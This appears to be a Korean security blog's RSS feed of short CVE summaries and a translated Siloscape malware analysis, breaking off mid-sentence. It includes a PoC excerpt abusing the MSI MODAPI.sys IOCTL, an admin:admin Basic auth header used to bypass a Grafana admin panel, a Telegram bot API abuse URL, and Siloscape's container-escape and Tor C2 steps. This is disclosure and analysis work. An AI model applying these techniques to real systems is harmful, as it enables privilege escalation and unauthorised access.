<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sat, 26 Jun 2021 04:57:45 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2021-31970: Windows Filtering Platform EoP</title>
      <link>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/</link>
      <guid>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/</guid>
      <pubDate>Sat, 26 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2175">Windows Filtering Platform Token Access Check EoP</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Filtering Platform(WFP)의 TCP/IP 드라이버는 token impersonation level에 대한 검증 미흡으로 발생하는 방화벽 정책 우회 및 권한상승 취약점이 패치되었습니다. </p><p>WFP는 네트워크 필터링을 생성하기 위한 API 및 시스템 서비스들입니다. 소캣에 작업이 들어오면 기본 필터링 엔진 및 Windows 방화벽에서 구성한 정책에 따라 작업이 허용되는지 확인하는데 그 필터링 정책은 호출자의 토큰 상태에 따라 달라집니다. 하지만 이 정책들을 다음과 같은 문제로 인해 우회할 수 있습니다.</p><ul><li><p>PsReferenceImpersonationToken을 호출해 토큰을 TOKEN_ACCESS_INFORMATION 구조체로 변환할 때 impersonation level이 SecurityImpersonation 이상인지 확인하지 않습니다.</p></li><li><p>TCP/IP 드라이버는 토큰 impersonating 도중에 소캣 생성을 허용합니다.</p></li></ul><p>일반 사용자가 시스템 토큰을 캡처하고 impersonat 할 수 있게 되므로 해커는 이를 악용해 방화벽 정책에 의해 명시적으로 허용되지 않는 작업을 수행할 수 있게 됩니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/tcpip/">tcpip</category>
      
      <category domain="https://hackyboiz.github.io/tags/wfp/">wfp</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-33739: Microsoft DWM core library의 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/</link>
      <guid>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/</guid>
      <pubDate>Fri, 25 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg&quot;&gt;https:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg">https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 21H1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://ko.wikipedia.org/wiki/%EB%8D%B0%EC%8A%A4%ED%81%AC%ED%86%B1_%EC%B0%BD_%EA%B4%80%EB%A6%AC%EC%9E%90">Windows 데스크톱 창 관리자</a>(Desktop Window Manager, dwm.exe)의 <code>dwmcore.dll</code> 모듈에서 UAF로 인한 권한 상승 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p><code>dwmcore.dll</code> 모듈의 <code>CinteractionTrackerBindingManager</code> 객체는 참조 횟수(reference count)를 기준으로 해제 시점이 결정됩니다. 객체를 바인딩하는 경우<code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수를 사용하고 참조 횟수가 1 증가하며, 바인딩 해제하는 경우 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수를 사용하며 참조 횟수가 1 감소합니다. 참조 횟수가 0이 된 객체는 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p><p>취약점은 같은 객체를 바인딩하는 리소스가 <code>CinteractionTrackerBindingManager</code> 객체를 참조했을 때 발생하며 해커가 DirectComposition API를 사용해 코드 수준에서 트리거가 가능합니다.</p><ol><li><p>동일한 <code>CinteractionTrackerMarshaler</code>를 바인딩하는 두 개의 리소스가 <code>CinteractionTrackerBindingManager</code>을 참조합니다.</p></li><li><p><code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수는 동일한 <code>CinteractionTrackerMarshaler</code>에 대해 한 번만 호출되어 참조 횟수는 1 증가합니다.</p></li><li><p>리소스의 사용이 종료되고 해제될 때 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수는 각각의 리소스에 대해 두 번 호출됩니다.</p><ul><li><p>첫 호출 시 <code>CinteractionTrackerBindingManager</code> 객체의 참조 횟수가 1 감소합니다. 0이 된 경우 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p></li><li><p>두 번째 호출 시 해제된 <code>CinteractionTrackerBindingManager</code> 객체에 접근하게 되어 UAF가 트리거 됩니다.</p></li></ul></li></ol><p>공개된 PoC는 <a href="https://github.com/mavillon1/CVE-2021-33739-POC">https://github.com/mavillon1/CVE-2021-33739-POC</a> 에서 확인할 수 있으며  <code>dwmcore.dll</code> 에서는 지난 4월 <a href="https://hackyboiz.github.io/2021/04/15/idioth/2021-04-15/">out of bounds write 취약점(CVE-2021-28310)</a>이 공개되기도 했습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-30522: Google Chrome WebAudio Code Execution Vulnerability</title>
      <link>https://hackyboiz.github.io/2021/06/24/idioth/2021-06-24/</link>
      <guid>https://hackyboiz.github.io/2021/06/24/idioth/2021-06-24/</guid>
      <pubDate>Thu, 24 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.talosintelligence.com/2021/06/chrome-web-aud</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/06/chrome-web-audio.html">Vulnerability Spotlight: Code execution vulnerability in Google Web Audio API</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Google Chrome 88.0.4324.146 (Official version) (64-bit)</li><li>Google Chrome 90.0.4405.0 (Build) (64-bit)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Chrome의 WebAudio <code>blink::AudioNodeOutput::Pull</code>에서 use after-free를 통한 code execution 취약점이 발견되었습니다. 조작된 웹 사이트에 접속하면 취약점이 트리거 되어 코드가 실행됩니다.</p><p>해당 취약점은 <code>blink::AudioNodeOutput::Pull</code> 함수에서 이미 초기화 된 메모리 영역인 <code>in_place_bus</code> (AudioBus 포인터)를 제공받아 발생합니다. WebAudio <code>createGain()</code>이 호출되면 AudioNode 객체 등이 할당되어 출력에 연결됩니다. AudioNode 인터페이스의 <code>connect()</code> 메서드는 노드의 출력 중 하나를 타깃에게 연결합니다. 루프에서 <code>new Float32Array/Uint8Array</code>를 사용하여 인접한 메모리를 연속해서 할당하며 이로 인해 garbage collector가 강제적으로 작동합니다. garbage collection이 수행되는 동안 audio rendering thread는 이미 해제된 AudioNode (AudioOutput)을 참조하므로 use after-free가 발생하며 <code>blink::AudioNodeOutput::Pull</code>은 이 AudioNode 객체를 실행합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/webaduio/">webaduio</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/24/idioth/2021-06-24/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-20226: 리눅스 커널의 UAF 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/23/fabu1ous/2021-06-23/</link>
      <guid>https://hackyboiz.github.io/2021/06/23/fabu1ous/2021-06-23/</guid>
      <pubDate>Wed, 23 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://flattsecurity.medium.com/cve-2021-20226-a-referen</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a">CVE-2021–20226 a reference counting bug which leads to local privilege escalation in io_uring.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>io_uring in Linux kernel 5.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Linux kernel 비동기 I/O 메커니즘인 io_uring에서 발생하는 Use-after-free 취약점에 대한 새로운 write-up이 공개되었습니다. File structure를 worker 스레드가 사용할 메모리로 옮기는 과정에서 reference 카운터를 늘리지 않고 file descriptor table을 공유하면 취약점이 발생합니다. </p><p>Worker 스레드는 file_struct 구조체에 대한 reference를 찾기 위해 함수 <code>fdget()</code>를 사용합니다. 하지만 <code>fdget()</code>는 file_struct에 대한 reference counter가 1일 때 이를 증가시키지 않으므로 <code>fdget()</code>에 의해 얻은 파일은 이미 닫히고 해제되어 있을 수도 있습니다.</p><p>이미 닫히고 해제된 파일에 접근해 작업한다는 것은 Use-after-free 취약점으로 해커는 이를 악용해 로컬 시스템에 서비스 거부 공격을 할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/23/fabu1ous/2021-06-23/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-29337: MSI Dragon Center의 로컬 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/</link>
      <guid>https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/</guid>
      <pubDate>Tue, 22 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/rjt-gupta/CVE-2021-29337&quot;&gt;CVE-2021-293</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rjt-gupta/CVE-2021-29337">CVE-2021-29337 - Privilege Escalation in MODAPI.sys (MSI Dragon Center)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MSI Dragon Center 2.0.104.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>LED 시스템, 시스템 환경 설정, 모바일 앱 원격 제어 등의 기능을 지원하는 MSI의 시스템 모니터링 유틸리티인 Dragon Center에서 발견된 로컬 권한 상승 취약점의 PoC가 공개되었습니다.</p><p>취약점은 Dragon Center의 커널 드라이버 <code>MODAPI.sys</code>에 존재하며 PoC의 일부 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">//Allocate Input Buffer</span>LPVOID lpInMemoryArea = VirtualAlloc((LPVOID)<span class="hljs-number">0x41000000</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);LPVOID lpOutMemoryArea = VirtualAlloc((LPVOID)<span class="hljs-number">0x42000000</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<span class="hljs-comment">//Set Input Buffer</span>DWORD pPhysicalMemAddr = <span class="hljs-number">0xE0000</span>;DWORD dwDataSizeToRead = <span class="hljs-number">0x4</span>;DWORD dwAmountOfDataToRead = <span class="hljs-number">8</span>;memmove(lpInMemoryArea, &amp;pPhysicalMemAddr, <span class="hljs-keyword">sizeof</span>(DWORD));memmove((BYTE*)lpInMemoryArea + <span class="hljs-number">0x8</span>, &amp;dwDataSizeToRead, <span class="hljs-keyword">sizeof</span>(DWORD));memmove((BYTE*)lpInMemoryArea + <span class="hljs-number">0xC</span>, &amp;dwAmountOfDataToRead, <span class="hljs-keyword">sizeof</span>(DWORD));<span class="hljs-comment">// Send IOCTL</span>DWORD dwLastError = DeviceIoControl(hDriver, <span class="hljs-number">0x9C406104</span>, lpInMemoryArea, <span class="hljs-number">0x10</span>, lpOutMemoryArea, <span class="hljs-number">0x40</span>, &amp;dwBytesOut, <span class="hljs-literal">NULL</span>);</code></pre><p><code>MODAPI.sys</code>의 METHOD_BUFFERED IOCTL <code>0x9C406104</code> 는 물리 메모리를 가상 주소 공간에 매핑하는 <code>MmMapIoSpace</code> 루틴을 호출합니다. 이를 악용해 해커가 Input Buffer인 <code>lpInMemoryArea</code> 에 권한 상승을 위한 임의의 값을 설정한 뒤 <code>DeviceIoControl</code>을 통해 IOCTL 요청을 보내면 Windows의 커널 메모리를 유저모드의 데이터로 임의로 조작 할 수 있으며 이는 로컬 권한 상승으로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/msi/">msi</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel-driver/">kernel driver</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] VirusTotal Grafana Admin Panel bypass</title>
      <link>https://hackyboiz.github.io/2021/06/21/idioth/2021-06-21/</link>
      <guid>https://hackyboiz.github.io/2021/06/21/idioth/2021-06-21/</guid>
      <pubDate>Mon, 21 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://infosecwriteups.com/grafana-admin-panel-bypass-in</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://infosecwriteups.com/grafana-admin-panel-bypass-in-google-acquisition-virustotal-c5ecc9d7b8ae">Grafana Admin Panel bypass in Google Acquisition(VirusTotal)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>grafana.internal.virustotal.com</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>구글이 인수한 VirusTotal의 서브 도메인 grafana.internal.virustotal.com에서 Admin Panel을 우회할 수 있는 취약점이 발견되었습니다. Grafana는 다중 플랫폼 오픈 소스 분석 및 모니터링 솔루션으로, 해당 도메인은 권한이 없으면 grafana 엔드포인트에 접속하거나 새로운 계정 생성이 불가능합니다. (Google, Github 등 다른 계정 이용 포함)</p><p>Grafana에는 사용자를 수정, 추가하고 비밀번호를 수정할 수 있는 엔드포인트가 존재하지만 일부 기능은 관리자만이 사용할 수 있습니다. Grafana에서 대부분의 민감한 request의 기본 인증 헤더는 <code>Authorization: Basic YWRtaW46YWRtaW4=</code>인데 base64로 decode하면 <code>admin:admin</code>이 나옵니다. 이를 사용해 관리자로 로그인한 후 관리자 권한을 가진 새 계정을 생성하여 애플리케이션 전체에 액세스할 수 있습니다.</p><p>또한 Admin Panel에서 VirusTotal 내부 텔레그램 그룹에 알림을 보내는 텔레그램 API 키가 존재합니다. 이를 통해 봇을 사용하여 텔레그램 그룹의 모든 사람에게 메시지를 전송할 수 있습니다.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.telegram.org<span class="hljs-regexp">/bot_API_KEY/</span>sendMessage?chat_id=userid&amp;text= SOME_URL_ENCODED_TEXT</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/grafana/">grafana</category>
      
      <category domain="https://hackyboiz.github.io/tags/virustotal/">virustotal</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/21/idioth/2021-06-21/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</title>
      <link>https://hackyboiz.github.io/2021/06/20/idioth/siloscape/</link>
      <guid>https://hackyboiz.github.io/2021/06/20/idioth/siloscape/</guid>
      <pubDate>Sun, 20 Jun 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;안녕하세요. idioth입니다. 원래 오늘은 ghidra의 다음 파트가 나오는 날이죠. 하지만 여러 가지 사정으로 인해 번역글을 작성하게 되었어요.&lt;/p&gt;
&lt;p&gt;아직 저는 기말 시험이 끝나지 않았고 또 사무실에 있는 노트북에 분석한 VM이 잠들어</description>
        
      
      
      
      <content:encoded><![CDATA[<p>안녕하세요. idioth입니다. 원래 오늘은 ghidra의 다음 파트가 나오는 날이죠. 하지만 여러 가지 사정으로 인해 번역글을 작성하게 되었어요.</p><p>아직 저는 기말 시험이 끝나지 않았고 또 사무실에 있는 노트북에 분석한 VM이 잠들어 있는데 어제 발에 레이저 치료를 받은 탓에 잘 걷지 못하고 있답니다 하하하. 생각보다 발 뒤꿈치로 걷는 거 할만해요 ^^….</p><p>아무튼 이런저런 이유로 기말 준비 중인 저에게 싸장님께서 읽으라고 추천해주신 글을 읽을 겸 번역해왔습니다! 후반부에 뺀 부분이 조금 있습니다! Siloscape의 행위를 보고 싶어서 IRC 접속 부분은 제외하고 번역을 했습니다. :)</p><blockquote><p>원문 글 : <a href="https://unit42.paloaltonetworks.com/siloscape/">Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</a></p></blockquote><h1 id="Executive-Summary"><a href="#Executive-Summary" class="headerlink" title="Executive Summary"></a>Executive Summary</h1><p>2021년 3월에 Windows container를 타깃으로 하는 최초의 악성코드를 발견했다. 지난 몇 년간 클라우드를 타깃으로 한 악성코드가 증가한 것을 생각하면 놀랍지는 않다. 이 악성코드는 container escape가 주목적이고 주로 server silo를 통해 Windows에서 구현되므로 Siloscape (silo escape처럼 들림 ㅎ)라고 이름 지었다.</p><p>Siloscape는 Windows container를 통해 Kubernetes clusters를 타깃으로 하는 악성코드이다. 주목적은 악성 컨테이너를 실행하기 위해 취약한 Kubernetes clusters에 백도어를 설치하는 것이다.</p><p>각 컨테이너는 하나의 클라우드 애플리케이션을 실행하는 반면에 하나의 클러스터는 여러 개의 클라우드 애플리케이션을 실행할 수 있으므로 개별 컨테이너를 손상시키는 것보다 전체 클러스터를 손상시키는 것이 더 치명적이다. 예시로 해커가 사용자 이름 및 암호, 조직의 기밀 정보와 내부 파일 또는 클러스텡 호스팅 된 전체 데이터베이스와 같은 중요 정보를 훔칠 수 있다. 해커가 랜섬웨어를 통해 조직의 파일을 인질로 잡을 수도 있다. 더 심각한 것은 많은 조직들이 클라우드로 이전하면서 개발, 테스트 환경으로 Kubernetes clusters를 많이 사용하고 있다. 이러한 점에서 광범위한 소프트웨어 공급망 공격이 발생할 수도 있다.</p><p>Siloscape는 C2 (Command and Cotrol) 서버에 익명으로 연결하기 위해 토르 프록시와 <code>.onion</code> 도메인을 사용한다. 23개(명?, 기관인지 사람인지 애매하네요)의 피해자를 찾았고 총 313명의 사용자를 호스팅 하는데 서버가 사용되고 있음을 발견했다. 이는 Siloscape가 캠페인의 빙산의 일각이라는 부분을 알려준다. 필자는 또한 이 캠페인이 1년 이상 지속되어 왔음을 발견했다.</p><p>이 리포트는 Windows container 취약점의 배경 지식, Siloscape의 기술 개요, Windows container 보안 권장 사항을 제공한다.</p><h1 id="Windows-Server-Container-취약점-개요"><a href="#Windows-Server-Container-취약점-개요" class="headerlink" title="Windows Server Container 취약점 개요"></a>Windows Server Container 취약점 개요</h1><p>2020년 7월 15에 <a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">Windows container boundaries에 관한 게시글</a>과 어떻게 우회할 수 있는지 작성했다. 이 게시글에서 컨테이너를 escape 하는 기술을 제공하고 해커가 escape 할 수 있는 위험이 있는 애플리케이션에 대해 이야기했다. 가장 중요한 애플리케이션은 Kubernetes의 Windows container node를 탈출하여 클러스터를 확산시키는 것이었다.</p><p>마이크로소프트에서 Windows Server container는 보안 기능이 아니라는 이유로 이 이슈를 취약점으로 생각하지 않았다. 따라서 컨테이너 내부에서 실행되는 각각의 애플리케이션은 호스트에서 직접 실행되는 것처럼 처리되어야 한다.</p><p>몇 주 후, Kubernetes가 이러한 이슈에 취약하다고 구글에 전달했다. 구글은 마이크로소프트에 전달하였고 마이크로소프트는 이 이슈를 Windows container에서 호스트로 escape 하는 것으로 결정하였지만 컨테이너에서 관리자 권한 없이 실행되면 취약점으로 간주된다.</p><p>그 후에 Windows Server container를 타깃으로 한 악성코드 Siloscape를 발견하였다. Siloscape는 Hyper-V가 아닌 Server Container를 사용하는 Kubernetes을 타깃으로 하는 난독화된 악성코드이며 주목적은 설정이 미흡한 Kubernetes 클러스터에 백도어를 열어 암호 화폐 채굴과 같은 악성 container를 실행하는 것이다.</p><p>악성코드의 동작과 기술에 대한 특징은 다음과 같다:</p><ul><li>알려진 취약점 (1-day)를 사용하여 타깃 클라우드 애플리케이션에 접근</li><li>Windows container escape를 통해 컨테이너를 escape 하고 underlying node에서 코드를 실행</li><li>node의 자격 증명을 통해 클러스터에 전파를 시도</li><li>토르 네트워크를 통해 IRC 프로토콜을 사용하여 C2 서버에 접속</li><li>추가 command 대기</li><li></li></ul><p>이 악성코드는 Kubernetes cluster의 컴퓨팅 리소스를 사용하여 암호화폐 채굴을 수행하고 손상된 클러스터에서 실행되는 수백 개의 애플리케이션의 중요 데이터를 가져올 수 있다.</p><p>C2 서버를 조사한 결과 이 악성코드는 큰 네트워크의 일부분이며 이 캠페인은 1년 이상 진행됐다. 게다가 캠페인의 특정 부분이 아직 활성화되어있다.</p><h1 id="기술-개요"><a href="#기술-개요" class="headerlink" title="기술 개요"></a>기술 개요</h1><p>Siloscape의 자세한 기술을 살펴보기 전에 전반적인 행위를 살펴보자.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled.png"></p><ol><li>해커는 1-day 취약점이나 웹페이지, 데이터베이스 취약점을 사용하여 Windows container 내부에 원격 코드 실행 (Remote Code Execution, RCE)을 수행</li><li>Siloscape (<code>CloudMalware.exe</code>)를 C2 접속 정보와 함께 command line으로 실행</li><li>Siloscape는 <code>SeTcbPrivilege</code> 권한을 얻기 위해 <code>CExecSvc.exe</code>를 impersonate (<a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">해당 게시글</a>에서 기술 상세 내용 확인 가능)</li><li>호스트에 global symbolic link를 생성하고 컨테이너화 된 X 드라이브를 호스트의 C 드라이브에 연결</li><li>global link를 사용하여 호스트에서 이름으로 <code>kubectl.exe</code>를 찾고 정규식으로 Kubernetes 설정 파일을 찾음</li><li>손상된 노드가 새로운 Kubernetes deployments를 생성할 수 있는 권한이 충분한지 확인</li><li>unzip을 사용해 압축 파일에서 토르 클라이언트를 디스크로 추출 (Siloscape의 main binary에 파일이 압축되어 있음)</li><li>토르 네트워크에 연결</li><li>command line argument를 통해 C2 서버의 비밀번호를 암호화</li><li><code>.onion</code> 도메인을 사용하여 C2 서버에 연결</li><li>C2 서버에서 오는 명령을 기다리고, 명령이 올 경우 실행</li></ol><p>컨테이너를 타깃으로 한 다른 암호화폐 채굴이 주 목적인 악성코드들과 다르게 Siloscape는 클러스터를 손상시키지 않는다. 대신에 탐지 및 추적을 방지하고 클러스터에 백도어를 설치하는 데에 집중했다.</p><h1 id="Defense-우회와-난독화"><a href="#Defense-우회와-난독화" class="headerlink" title="Defense 우회와 난독화"></a>Defense 우회와 난독화</h1><p>Siloscape는 심하게 난독화되어 있으며 대부분의 문자열을 읽을 수 없다. 난독화 로직은 어렵지 않지만 리버싱 하기 너무 힘들다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%201.png"></p><p>단순한 API 호출도 난독화 되어있으며 함수를 단순하게 호출하지 않고 Native API (NTAPI)를 사용하였다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%202.png"></p><p>예시로 <code>CreateFile</code>을 호출하는 대신에 <code>NtCreateFile</code>을 호출한다. <code>NtCreateFile</code>을 직접 호출하는 대신에 런타임에서 <code>ntdll.dll</code>에서 함수 이름을 찾아 주소로 점프하여 호출한다. 그뿐만 아니라 함수와 모듈 이름을 난독화하고 런타임에서 복호화한다. 정적 분석으로는 분석하기 어렵고 리버스 엔지니어링 하는데 힘든 악성코드이다.</p><p>Siloscape는 한 쌍의 key를 사용하여 C2 서버의 비밀번호를 복호화한다. 난독화 중에서 가장 중요한 특징은 키 하나는 바이너리에 하드 코딩되어 있는데, 하나는 command line argument에서 제공된다는 점이다. AutoFocus와 VirusTotal 같은 여러 엔진에서 hash를 검색해도 결과를 찾을 수 없었다. 이를 통해 Siloscape는 새로운 공격을 할 때 고유한 키를 사용해서 컴파일을 하는 것을 유추할 수 있다. 하드 코딩된 키는 바이너리들을 살짝씩 다르게 만들어서 hash를 통해 찾을 수 없음을 설명한다. 또 hash만으로 Siloscape를 탐지할 수 없다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%203.png"></p><p>다른 흥미로운 특징은 Visual Studio의 Resource Manager를 사용한 것이다. Visual Studio에 내장된 기능으로 어떤 파일이든 원본 바이너리에 추가할 수 있고 간단한 API 호출을 통해 포인터를 얻을 수 있다. Siloscape는 디스크에 토르 아카이브와 아카이브를 열기 위해 사용되는 unzip 바이너리를 이를 통해 추가했다. 또한 토르를 통해 C2 서버에 안전하게 접속한다.</p><h1 id="The-Container-Escape"><a href="#The-Container-Escape" class="headerlink" title="The Container Escape"></a>The Container Escape</h1><p>Siloscape의 흥미로운 점 중 하나는 컨테이너를 escape 하는 것이다. escape를 하기 위해 system call <code>NtSetInformationSymbolicLink</code>를 실행하려면 <code>SeTcbPrivilege</code> 권한을 얻어야 한다. 여기에는 몇 가지 방법이 있다. 예를 들어 권한을 가진 